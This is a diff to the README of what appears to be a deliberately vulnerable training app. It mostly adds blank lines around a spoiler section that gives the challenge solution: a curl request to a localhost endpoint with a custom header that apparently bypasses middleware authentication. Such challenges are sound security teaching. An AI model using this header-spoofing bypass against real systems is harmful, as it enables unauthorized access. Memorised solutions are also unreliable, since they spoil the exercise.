@@ -141,19 +141,28 @@ This application demonstrates a critical security flaw:
 
 ---
 
+
+
+
+
 ## 🏆 Solution
+
 
 <details>
 <summary>⚠️ SPOILER: Click to see the solution</summary>
 
+
 ### Exploit Command
+
 
 ```bash
 curl -i http://localhost:3000/api/hacker \
   -H "x-vvortex-auth: middleware"
 ```
 
+
 ### Expected Success Response
+
 
 ```json
 {
@@ -168,6 +177,7 @@ curl -i http://localhost:3000/api/hacker \
   }
 }
 ```
+
 
 ### How It Works
 
